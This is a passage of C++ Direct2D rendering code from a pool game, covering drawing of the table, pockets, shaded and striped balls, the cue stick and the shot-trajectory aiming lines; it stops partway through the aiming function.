        if (currentGameState == GAME_OVER && pTextFormat) {
            ID2D1SolidColorBrush* pBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pBrush);
            if (pBrush) {
                D2D1_RECT_F layoutRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP + TABLE_HEIGHT / 2 - 30, TABLE_RIGHT, TABLE_TOP + TABLE_HEIGHT / 2 + 30);
                pRT->DrawText(
                    gameOverMessage.c_str(),
                    (UINT32)gameOverMessage.length(),
                    pTextFormat, // Use large format maybe?
                    &layoutRect,
                    pBrush
                );
                SafeRelease(&pBrush);
            }
        }

    }

    void DrawTable(ID2D1RenderTarget* pRT, ID2D1Factory* pFactory) {
        ID2D1SolidColorBrush* pBrush = nullptr;

        // === Draw Full Orange Frame (Table Border) ===
        ID2D1SolidColorBrush* pFrameBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.9157f, 0.6157f, 0.2000f), &pFrameBrush); //NEWCOLOR ::Orange (no brackets) => (0.9157, 0.6157, 0.2000)
        //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pFrameBrush); //NEWCOLOR ::Orange (no brackets) => (0.9157, 0.6157, 0.2000)
        if (pFrameBrush) {
            D2D1_RECT_F outerRect = D2D1::RectF(
                TABLE_LEFT - CUSHION_THICKNESS,
                TABLE_TOP - CUSHION_THICKNESS,
                TABLE_RIGHT + CUSHION_THICKNESS,
                TABLE_BOTTOM + CUSHION_THICKNESS
            );
            pRT->FillRectangle(&outerRect, pFrameBrush);
            SafeRelease(&pFrameBrush);
        }

        // Draw Table Bed (Green Felt)
        pRT->CreateSolidColorBrush(TABLE_COLOR, &pBrush);
        if (!pBrush) return;
        D2D1_RECT_F tableRect = D2D1::RectF(TABLE_LEFT, TABLE_TOP, TABLE_RIGHT, TABLE_BOTTOM);
        pRT->FillRectangle(&tableRect, pBrush);
        SafeRelease(&pBrush);

        // Draw Cushions (Red Border)
        pRT->CreateSolidColorBrush(CUSHION_COLOR, &pBrush);
        if (!pBrush) return;
        // Top Cushion (split by middle pocket)
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_TOP - CUSHION_THICKNESS, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_TOP), pBrush);
        // Bottom Cushion (split by middle pocket)
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_LEFT + TABLE_WIDTH / 2.f - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT + TABLE_WIDTH / 2.f + HOLE_VISUAL_RADIUS, TABLE_BOTTOM, TABLE_RIGHT - HOLE_VISUAL_RADIUS, TABLE_BOTTOM + CUSHION_THICKNESS), pBrush);
        // Left Cushion
        pRT->FillRectangle(D2D1::RectF(TABLE_LEFT - CUSHION_THICKNESS, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_LEFT, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
        // Right Cushion
        pRT->FillRectangle(D2D1::RectF(TABLE_RIGHT, TABLE_TOP + HOLE_VISUAL_RADIUS, TABLE_RIGHT + CUSHION_THICKNESS, TABLE_BOTTOM - HOLE_VISUAL_RADIUS), pBrush);
        SafeRelease(&pBrush);


        // Draw Pockets (Black Circles)
        pRT->CreateSolidColorBrush(POCKET_COLOR, &pBrush);
        if (!pBrush) return;
        for (int i = 0; i < 6; ++i) {
            D2D1_ELLIPSE ellipse = D2D1::Ellipse(pocketPositions[i], HOLE_VISUAL_RADIUS, HOLE_VISUAL_RADIUS);
            pRT->FillEllipse(&ellipse, pBrush);
        }
        SafeRelease(&pBrush);

        // Draw Headstring Line (White)
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.4235f, 0.5647f, 0.1765f, 1.0f), &pBrush); // NEWCOLOR ::White => (0.2784, 0.4549, 0.1843)
        //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pBrush); // NEWCOLOR ::White => (0.2784, 0.4549, 0.1843)
        if (!pBrush) return;
        pRT->DrawLine(
            D2D1::Point2F(HEADSTRING_X, TABLE_TOP),
            D2D1::Point2F(HEADSTRING_X, TABLE_BOTTOM),
            pBrush,
            1.0f // Line thickness
        );
        SafeRelease(&pBrush);

        // Draw Semicircle facing West (flat side East)
        // Draw Semicircle facing East (curved side on the East, flat side on the West)
        ID2D1PathGeometry* pGeometry = nullptr;
        HRESULT hr = pFactory->CreatePathGeometry(&pGeometry);
        if (SUCCEEDED(hr) && pGeometry)
        {
            ID2D1GeometrySink* pSink = nullptr;
            hr = pGeometry->Open(&pSink);
            if (SUCCEEDED(hr) && pSink)
            {
                float radius = 60.0f; // Radius for the semicircle
                D2D1_POINT_2F center = D2D1::Point2F(HEADSTRING_X, (TABLE_TOP + TABLE_BOTTOM) / 2.0f);

                // For a semicircle facing East (curved side on the East), use the top and bottom points.
                D2D1_POINT_2F startPoint = D2D1::Point2F(center.x, center.y - radius); // Top point

                pSink->BeginFigure(startPoint, D2D1_FIGURE_BEGIN_HOLLOW);

                D2D1_ARC_SEGMENT arc = {};
                arc.point = D2D1::Point2F(center.x, center.y + radius); // Bottom point
                arc.size = D2D1::SizeF(radius, radius);
                arc.rotationAngle = 0.0f;
                // Use the correct identifier with the extra underscore:
                arc.sweepDirection = D2D1_SWEEP_DIRECTION_COUNTER_CLOCKWISE;
                arc.arcSize = D2D1_ARC_SIZE_SMALL;

                pSink->AddArc(&arc);
                pSink->EndFigure(D2D1_FIGURE_END_OPEN);
                pSink->Close();
                SafeRelease(&pSink);

                ID2D1SolidColorBrush* pArcBrush = nullptr;
                //pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.3f), &pArcBrush);
                pRT->CreateSolidColorBrush(D2D1::ColorF(0.4235f, 0.5647f, 0.1765f, 1.0f), &pArcBrush);
                if (pArcBrush)
                {
                    pRT->DrawGeometry(pGeometry, pArcBrush, 1.5f);
                    SafeRelease(&pArcBrush);
                }
            }
            SafeRelease(&pGeometry);
        }




    }


    // ----------------------------------------------
    //  Helper : clamp to [0,1] and lighten a colour
    // ----------------------------------------------
    static D2D1_COLOR_F Lighten(const D2D1_COLOR_F& c, float factor = 1.25f)
    {
        return D2D1::ColorF(
            std::min(1.0f, c.r * factor),
            std::min(1.0f, c.g * factor),
            std::min(1.0f, c.b * factor),
            c.a);
    }

    // ------------------------------------------------
    //  NEW  DrawBalls – radial-gradient “spot-light”
    // ------------------------------------------------
    void DrawBalls(ID2D1RenderTarget* pRT)
    {
        if (!pRT) return;

        ID2D1SolidColorBrush* pStripeBrush = nullptr;    // white stripe
        ID2D1SolidColorBrush* pBorderBrush = nullptr;    // black ring

        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);

        for (const Ball& b : balls)
        {
            if (b.isPocketed) continue;

            //------------------------------------------
            // Build the radial gradient for THIS ball
            //------------------------------------------
            ID2D1GradientStopCollection* pStops = nullptr;
            ID2D1RadialGradientBrush* pRad = nullptr;

            D2D1_GRADIENT_STOP gs[3];
            gs[0].position = 0.0f;  gs[0].color = D2D1::ColorF(1, 1, 1, 0.95f);     // bright spot
            gs[1].position = 0.35f; gs[1].color = Lighten(b.color);                 // transitional
            gs[2].position = 1.0f;  gs[2].color = b.color;                          // base colour

            pRT->CreateGradientStopCollection(gs, 3, &pStops);

            if (pStops)
            {
                // Place the hot-spot slightly towards top-left to look more 3-D
                D2D1_POINT_2F origin = D2D1::Point2F(b.x - BALL_RADIUS * 0.4f,
                    b.y - BALL_RADIUS * 0.4f);

                D2D1_RADIAL_GRADIENT_BRUSH_PROPERTIES props =
                    D2D1::RadialGradientBrushProperties(
                        origin,                        // gradientOrigin
                        D2D1::Point2F(0, 0),           // offset (not used here)
                        BALL_RADIUS * 1.3f,            // radiusX
                        BALL_RADIUS * 1.3f);           // radiusY

                pRT->CreateRadialGradientBrush(props, pStops, &pRad);
                SafeRelease(&pStops);
            }

            //------------------------------------------
            //  Draw the solid or striped ball itself
            //------------------------------------------
            D2D1_ELLIPSE outer = D2D1::Ellipse(
                D2D1::Point2F(b.x, b.y), BALL_RADIUS, BALL_RADIUS);

            if (pRad)  pRT->FillEllipse(&outer, pRad);

            // ----------  Stripe overlay  -------------
            if (b.type == BallType::STRIPE && pStripeBrush)
            {
                // White band
                D2D1_RECT_F stripe = D2D1::RectF(
                    b.x - BALL_RADIUS,
                    b.y - BALL_RADIUS * 0.40f,
                    b.x + BALL_RADIUS,
                    b.y + BALL_RADIUS * 0.40f);
                pRT->FillRectangle(&stripe, pStripeBrush);

                // Inner circle (give stripe area same glossy shading)
                if (pRad)
                {
                    D2D1_ELLIPSE inner = D2D1::Ellipse(
                        D2D1::Point2F(b.x, b.y),
                        BALL_RADIUS * 0.60f,
                        BALL_RADIUS * 0.60f);
                    pRT->FillEllipse(&inner, pRad);
                }
            }

            // Black border
            if (pBorderBrush)
                pRT->DrawEllipse(&outer, pBorderBrush, 1.5f);

            SafeRelease(&pRad);
        }

        SafeRelease(&pStripeBrush);
        SafeRelease(&pBorderBrush);
    }

    /*void DrawBalls(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pStripeBrush = nullptr; // For stripe pattern

        pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBrush); // Placeholder
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);

        if (!pBrush || !pStripeBrush) {
            SafeRelease(&pBrush);
            SafeRelease(&pStripeBrush);
            return;
        }


        for (size_t i = 0; i < balls.size(); ++i) {
            const Ball& b = balls[i];
            if (!b.isPocketed) {
                D2D1_ELLIPSE ellipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS, BALL_RADIUS);

                // Set main ball color
                pBrush->SetColor(b.color);
                pRT->FillEllipse(&ellipse, pBrush);

                // Draw Stripe if applicable
                if (b.type == BallType::STRIPE) {
                    // Draw a white band across the middle (simplified stripe)
                    D2D1_RECT_F stripeRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS * 0.4f, b.x + BALL_RADIUS, b.y + BALL_RADIUS * 0.4f);
                    // Need to clip this rectangle to the ellipse bounds - complex!
                    // Alternative: Draw two colored arcs leaving a white band.
                    // Simplest: Draw a white circle inside, slightly smaller.
                    D2D1_ELLIPSE innerEllipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS * 0.6f, BALL_RADIUS * 0.6f);
                    pRT->FillEllipse(innerEllipse, pStripeBrush); // White center part
                    pBrush->SetColor(b.color); // Set back to stripe color
                    pRT->FillEllipse(innerEllipse, pBrush); // Fill again, leaving a ring - No, this isn't right.

                    // Let's try drawing a thick white line across
                    // This doesn't look great. Just drawing solid red for stripes for now.
                }

                // Draw Number (Optional - requires more complex text layout or pre-rendered textures)
                // if (b.id != 0 && pTextFormat) {
                //     std::wstring numStr = std::to_wstring(b.id);
                //     D2D1_RECT_F textRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS, b.x + BALL_RADIUS, b.y + BALL_RADIUS);
                //     ID2D1SolidColorBrush* pNumBrush = nullptr;
                //     D2D1_COLOR_F numCol = (b.type == BallType::SOLID || b.id == 8) ? D2D1::ColorF(D2D1::ColorF::Black) : D2D1::ColorF(D2D1::ColorF::White);
                //     pRT->CreateSolidColorBrush(numCol, &pNumBrush);
                //     // Create a smaller text format...
                //     // pRT->DrawText(numStr.c_str(), numStr.length(), pSmallTextFormat, &textRect, pNumBrush);
                //     SafeRelease(&pNumBrush);
                // }
            }
        }

        SafeRelease(&pBrush);
        SafeRelease(&pStripeBrush);
    }*/


    /*void DrawAimingAids(ID2D1RenderTarget* pRT) {
        // Condition check at start (Unchanged)
        //if (currentGameState != PLAYER1_TURN && currentGameState != PLAYER2_TURN &&
            //currentGameState != BREAKING && currentGameState != AIMING)
        //{
            //return;
        //}
            // NEW Condition: Allow drawing if it's a human player's active turn/aiming/breaking,
        // OR if it's AI's turn and it's in AI_THINKING state (calculating) or BREAKING (aiming break).
        bool isHumanInteracting = (!isPlayer2AI || currentPlayer == 1) &&
            (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == BREAKING || currentGameState == AIMING);
        // AI_THINKING state is when AI calculates shot. AIMakeDecision sets cueAngle/shotPower.
        // Also include BREAKING state if it's AI's turn and isOpeningBreakShot for break aim visualization.
            // NEW Condition: AI is displaying its aim
        bool isAiVisualizingShot = (isPlayer2AI && currentPlayer == 2 &&
            currentGameState == AI_THINKING && aiIsDisplayingAim);

        if (!isHumanInteracting && !(isAiVisualizingShot || (currentGameState == AI_THINKING && aiIsDisplayingAim))) {
            return;
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall || cueBall->isPocketed) return; // Don't draw if cue ball is gone

        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        ID2D1StrokeStyle* pDashedStyle = nullptr;
        ID2D1SolidColorBrush* pCueBrush = nullptr;
        ID2D1SolidColorBrush* pReflectBrush = nullptr; // Brush for reflection line

        // Ensure render target is valid
        if (!pRT) return;

        // Create Brushes and Styles (check for failures)
        HRESULT hr;
        hr = pRT->CreateSolidColorBrush(AIM_LINE_COLOR, &pBrush);
        if FAILED(hr) { SafeRelease(&pBrush); return; }
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pGhostBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); return; }
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0.6f, 0.4f, 0.2f), &pCueBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); return; }
        // Create reflection brush (e.g., lighter shade or different color)
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LightCyan, 0.6f), &pReflectBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); SafeRelease(&pReflectBrush); return; }
        // Create a Cyan brush for primary and secondary lines //orig(75.0f / 255.0f, 0.0f, 130.0f / 255.0f);indigoColor
        D2D1::ColorF cyanColor(0.0, 255.0, 255.0, 255.0f);
        ID2D1SolidColorBrush* pCyanBrush = nullptr;
        hr = pRT->CreateSolidColorBrush(cyanColor, &pCyanBrush);
        if (FAILED(hr)) {
            SafeRelease(&pCyanBrush);
            // handle error if needed
        }
        // Create a Purple brush for primary and secondary lines
        D2D1::ColorF purpleColor(255.0f, 0.0f, 255.0f, 255.0f);
        ID2D1SolidColorBrush* pPurpleBrush = nullptr;
        hr = pRT->CreateSolidColorBrush(purpleColor, &pPurpleBrush);
        if (FAILED(hr)) {
            SafeRelease(&pPurpleBrush);
            // handle error if needed
        }

        if (pFactory) {
            D2D1_STROKE_STYLE_PROPERTIES strokeProps = D2D1::StrokeStyleProperties();
            strokeProps.dashStyle = D2D1_DASH_STYLE_DASH;
            hr = pFactory->CreateStrokeStyle(&strokeProps, nullptr, 0, &pDashedStyle);
            if FAILED(hr) { pDashedStyle = nullptr; }
        }


        // --- Cue Stick Drawing (Unchanged from previous fix) ---
        const float baseStickLength = 150.0f;
        const float baseStickThickness = 4.0f;
        float stickLength = baseStickLength * 1.4f;
        float stickThickness = baseStickThickness * 1.5f;
        float stickAngle = cueAngle + PI;
        float powerOffset = 0.0f;
        //if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
            // Show power offset if human is aiming/dragging, or if AI is preparing its shot (AI_THINKING or AI Break)
        if ((isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) || isAiVisualizingShot) { // Use the new condition
            powerOffset = shotPower * 5.0f;
        }
        D2D1_POINT_2F cueStickEnd = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (stickLength + powerOffset), cueBall->y + sinf(stickAngle) * (stickLength + powerOffset));
        D2D1_POINT_2F cueStickTip = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (powerOffset + 5.0f), cueBall->y + sinf(stickAngle) * (powerOffset + 5.0f));
        pRT->DrawLine(cueStickTip, cueStickEnd, pCueBrush, stickThickness);


        // --- Projection Line Calculation ---
        float cosA = cosf(cueAngle);
        float sinA = sinf(cueAngle);
        float rayLength = TABLE_WIDTH + TABLE_HEIGHT; // Ensure ray is long enough
        D2D1_POINT_2F rayStart = D2D1::Point2F(cueBall->x, cueBall->y);
        D2D1_POINT_2F rayEnd = D2D1::Point2F(rayStart.x + cosA * rayLength, rayStart.y + sinA * rayLength);*/

    void DrawAimingAids(ID2D1RenderTarget* pRT) {
        // Determine if aiming aids should be drawn.
        bool isHumanInteracting = (!isPlayer2AI || currentPlayer == 1) &&
            (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == BREAKING || currentGameState == AIMING ||
                currentGameState == CHOOSING_POCKET_P1 || currentGameState == CHOOSING_POCKET_P2);

        // FOOLPROOF FIX: This is the new condition to show the AI's aim.
        bool isAiVisualizingShot = (isPlayer2AI && currentPlayer == 2 && aiIsDisplayingAim);

        if (!isHumanInteracting && !isAiVisualizingShot) {
            return;
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall || cueBall->isPocketed) return;

        // --- Brush and Style Creation (No changes here) ---
        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        ID2D1StrokeStyle* pDashedStyle = nullptr;
        ID2D1SolidColorBrush* pCueBrush = nullptr;
        ID2D1SolidColorBrush* pReflectBrush = nullptr;
        ID2D1SolidColorBrush* pCyanBrush = nullptr;
        ID2D1SolidColorBrush* pPurpleBrush = nullptr;
        pRT->CreateSolidColorBrush(AIM_LINE_COLOR, &pBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pGhostBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.6f, 0.4f, 0.2f), &pCueBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LightCyan, 0.6f), &pReflectBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Cyan), &pCyanBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Purple), &pPurpleBrush);
        if (pFactory) {
            D2D1_STROKE_STYLE_PROPERTIES strokeProps = D2D1::StrokeStyleProperties();
            strokeProps.dashStyle = D2D1_DASH_STYLE_DASH;
            pFactory->CreateStrokeStyle(&strokeProps, nullptr, 0, &pDashedStyle);
        }
        // --- End Brush Creation ---

        // --- FOOLPROOF FIX: Use the AI's planned angle and power for drawing ---
        float angleToDraw = cueAngle;
        float powerToDraw = shotPower;

        if (isAiVisualizingShot) {
            // When the AI is showing its aim, force the drawing to use its planned shot details.
            angleToDraw = aiPlannedShotDetails.angle;
            powerToDraw = aiPlannedShotDetails.power;
        }
        // --- End AI Aiming Fix ---

        // --- Cue Stick Drawing ---
        const float baseStickLength = 150.0f;
        const float baseStickThickness = 4.0f;
        float stickLength = baseStickLength * 1.4f;
        float stickThickness = baseStickThickness * 1.5f;
        float stickAngle = angleToDraw + PI; // Use the angle we determined
        float powerOffset = 0.0f;
        if ((isAiming || isDraggingStick) || isAiVisualizingShot) {
            powerOffset = powerToDraw * 5.0f; // Use the power we determined
        }
        D2D1_POINT_2F cueStickEnd = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (stickLength + powerOffset), cueBall->y + sinf(stickAngle) * (stickLength + powerOffset));
        D2D1_POINT_2F cueStickTip = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (powerOffset + 5.0f), cueBall->y + sinf(stickAngle) * (powerOffset + 5.0f));
        pRT->DrawLine(cueStickTip, cueStickEnd, pCueBrush, stickThickness);

        // --- Projection Line Calculation ---
        float cosA = cosf(angleToDraw); // Use the angle we determined
        float sinA = sinf(angleToDraw);
        float rayLength = TABLE_WIDTH + TABLE_HEIGHT;
        D2D1_POINT_2F rayStart = D2D1::Point2F(cueBall->x, cueBall->y);
        D2D1_POINT_2F rayEnd = D2D1::Point2F(rayStart.x + cosA * rayLength, rayStart.y + sinA * rayLength);

        // Find the first ball hit by the aiming ray
        Ball* hitBall = nullptr;
        float firstHitDistSq = -1.0f;
        D2D1_POINT_2F ballCollisionPoint = { 0, 0 }; // Point on target ball circumference
        D2D1_POINT_2F ghostBallPosForHit = { 0, 0 }; // Ghost ball pos for the hit ball

        hitBall = FindFirstHitBall(rayStart, cueAngle, firstHitDistSq);
        if (hitBall) {
            // Calculate the point on the target ball's circumference
            float collisionDist = sqrtf(firstHitDistSq);
            ballCollisionPoint = D2D1::Point2F(rayStart.x + cosA * collisionDist, rayStart.y + sinA * collisionDist);
            // Calculate ghost ball position for this specific hit (used for projection consistency)
            ghostBallPosForHit = D2D1::Point2F(hitBall->x - cosA * BALL_RADIUS, hitBall->y - sinA * BALL_RADIUS); // Approx.
        }

        // Find the first rail hit by the aiming ray
        D2D1_POINT_2F railHitPoint = rayEnd; // Default to far end if no rail hit
        float minRailDistSq = rayLength * rayLength;
        int hitRailIndex = -1; // 0:Left, 1:Right, 2:Top, 3:Bottom

        // Define table edge segments for intersection checks
        D2D1_POINT_2F topLeft = D2D1::Point2F(TABLE_LEFT, TABLE_TOP);
        D2D1_POINT_2F topRight = D2D1::Point2F(TABLE_RIGHT, TABLE_TOP);
        D2D1_POINT_2F bottomLeft = D2D1::Point2F(TABLE_LEFT, TABLE_BOTTOM);
        D2D1_POINT_2F bottomRight = D2D1::Point2F(TABLE_RIGHT, TABLE_BOTTOM);

        D2D1_POINT_2F currentIntersection;

        // Check Left Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topLeft, bottomLeft, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 0; }
        }
        // Check Right Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topRight, bottomRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 1; }
        }
        // Check Top Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topLeft, topRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 2; }
        }
        // Check Bottom Rail
        if (LineSegmentIntersection(rayStart, rayEnd, bottomLeft, bottomRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 3; }
        }


        // --- Determine final aim line end point ---
        D2D1_POINT_2F finalLineEnd = railHitPoint; // Assume rail hit first
        bool aimingAtRail = true;

        if (hitBall && firstHitDistSq < minRailDistSq) {
            // Ball collision is closer than rail collision
            finalLineEnd = ballCollisionPoint; // End line at the point of contact on the ball
            aimingAtRail = false;
        }

        // --- Draw Primary Aiming Line ---
        pRT->DrawLine(rayStart, finalLineEnd, pBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

        // --- Draw Target Circle/Indicator ---
        D2D1_ELLIPSE targetCircle = D2D1::Ellipse(finalLineEnd, BALL_RADIUS / 2.0f, BALL_RADIUS / 2.0f);
        pRT->DrawEllipse(&targetCircle, pBrush, 1.0f);

        // --- Draw Projection/Reflection Lines ---
        if (!aimingAtRail && hitBall) {
            // Aiming at a ball: Draw Ghost Cue Ball and Target Ball Projection
            D2D1_ELLIPSE ghostCue = D2D1::Ellipse(ballCollisionPoint, BALL_RADIUS, BALL_RADIUS); // Ghost ball at contact point
            pRT->DrawEllipse(ghostCue, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

            // Calculate target ball projection based on impact line (cue collision point -> target center)
            float targetProjectionAngle = atan2f(hitBall->y - ballCollisionPoint.y, hitBall->x - ballCollisionPoint.x);
            // Clamp angle calculation if distance is tiny
            if (GetDistanceSq(hitBall->x, hitBall->y, ballCollisionPoint.x, ballCollisionPoint.y) < 1.0f) {
                targetProjectionAngle = cueAngle; // Fallback if overlapping
            }

            D2D1_POINT_2F targetStartPoint = D2D1::Point2F(hitBall->x, hitBall->y);
            D2D1_POINT_2F targetProjectionEnd = D2D1::Point2F(
                hitBall->x + cosf(targetProjectionAngle) * 50.0f, // Projection length 50 units
                hitBall->y + sinf(targetProjectionAngle) * 50.0f
            );
            // Draw solid line for target projection
            //pRT->DrawLine(targetStartPoint, targetProjectionEnd, pBrush, 1.0f);

        //new code start

                    // Dual trajectory with edge-aware contact simulation
            D2D1_POINT_2F dir = {
                targetProjectionEnd.x - targetStartPoint.x,
                targetProjectionEnd.y - targetStartPoint.y
            };
            float dirLen = sqrtf(dir.x * dir.x + dir.y * dir.y);
            dir.x /= dirLen;
            dir.y /= dirLen;

            D2D1_POINT_2F perp = { -dir.y, dir.x };

            // Approximate cue ball center by reversing from tip
            D2D1_POINT_2F cueBallCenterForGhostHit = { // Renamed for clarity if you use it elsewhere
                targetStartPoint.x - dir.x * BALL_RADIUS,
                targetStartPoint.y - dir.y * BALL_RADIUS
            };

            // REAL contact-ball center - use your physics object's center:
            // (replace 'objectBallPos' with whatever you actually call it)
            // (targetStartPoint is already hitBall->x, hitBall->y)
            D2D1_POINT_2F contactBallCenter = targetStartPoint; // Corrected: Use the object ball's actual center
            //D2D1_POINT_2F contactBallCenter = D2D1::Point2F(hitBall->x, hitBall->y);

           // The 'offset' calculation below uses 'cueBallCenterForGhostHit' (originally 'cueBallCenter').
           // This will result in 'offset' being 0 because 'cueBallCenterForGhostHit' is defined
           // such that (targetStartPoint - cueBallCenterForGhostHit) is parallel to 'dir',
           // and 'perp' is perpendicular to 'dir'.
           // Consider Change 2 if this 'offset' is not behaving as intended for the secondary line.
            /*float offset = ((targetStartPoint.x - cueBallCenterForGhostHit.x) * perp.x +
                (targetStartPoint.y - cueBallCenterForGhostHit.y) * perp.y);*/
                /*float offset = ((targetStartPoint.x - cueBallCenter.x) * perp.x +
                    (targetStartPoint.y - cueBallCenter.y) * perp.y);
                float absOffset = fabsf(offset);
                float side = (offset >= 0 ? 1.0f : -1.0f);*/

                // Use actual cue ball center for offset calculation if 'offset' is meant to quantify the cut
            D2D1_POINT_2F actualCueBallPhysicalCenter = D2D1::Point2F(cueBall->x, cueBall->y); // This is also rayStart

            // Offset calculation based on actual cue ball position relative to the 'dir' line through targetStartPoint
            float offset = ((targetStartPoint.x - actualCueBallPhysicalCenter.x) * perp.x +
                (targetStartPoint.y - actualCueBallPhysicalCenter.y) * perp.y);
            float absOffset = fabsf(offset);
            float side = (offset >= 0 ? 1.0f : -1.0f);


            // Actual contact point on target ball edge
            D2D1_POINT_2F contactPoint = {
            contactBallCenter.x + perp.x * BALL_RADIUS * side,
            contactBallCenter.y + perp.y * BALL_RADIUS * side
            };

            // Tangent (cut shot) path from contact point
                // Tangent (cut shot) path: from contact point to contact ball center
            D2D1_POINT_2F objectBallDir = {
                contactBallCenter.x - contactPoint.x,
                contactBallCenter.y - contactPoint.y
            };
            float oLen = sqrtf(objectBallDir.x * objectBallDir.x + objectBallDir.y * objectBallDir.y);
            if (oLen != 0.0f) {
                objectBallDir.x /= oLen;
                objectBallDir.y /= oLen;
            }

            const float PRIMARY_LEN = 150.0f; //default=150.0f
            const float SECONDARY_LEN = 150.0f; //default=150.0f
            const float STRAIGHT_EPSILON = BALL_RADIUS * 0.05f;

            D2D1_POINT_2F primaryEnd = {
                targetStartPoint.x + dir.x * PRIMARY_LEN,
                targetStartPoint.y + dir.y * PRIMARY_LEN
            };

            // Secondary line starts from the contact ball's center
            D2D1_POINT_2F secondaryStart = contactBallCenter;
            D2D1_POINT_2F secondaryEnd = {
                secondaryStart.x + objectBallDir.x * SECONDARY_LEN,
                secondaryStart.y + objectBallDir.y * SECONDARY_LEN
            };

            if (absOffset < STRAIGHT_EPSILON)  // straight shot?
            {
                // Straight: secondary behind primary
                        // secondary behind primary {pDashedStyle param at end}
                pRT->DrawLine(secondaryStart, secondaryEnd, pPurpleBrush, 2.0f);
                //pRT->DrawLine(secondaryStart, secondaryEnd, pGhostBrush, 1.0f);
                pRT->DrawLine(targetStartPoint, primaryEnd, pCyanBrush, 2.0f);
                //pRT->DrawLine(targetStartPoint, primaryEnd, pBrush, 1.0f);
            }
            else
            {
                // Cut shot: both visible
                        // both visible for cut shot
                pRT->DrawLine(secondaryStart, secondaryEnd, pPurpleBrush, 2.0f);
                //pRT->DrawLine(secondaryStart, secondaryEnd, pGhostBrush, 1.0f);
                pRT->DrawLine(targetStartPoint, primaryEnd, pCyanBrush, 2.0f);
                //pRT->DrawLine(targetStartPoint, primaryEnd, pBrush, 1.0f);
            }
            // End improved trajectory logic

        //new code end

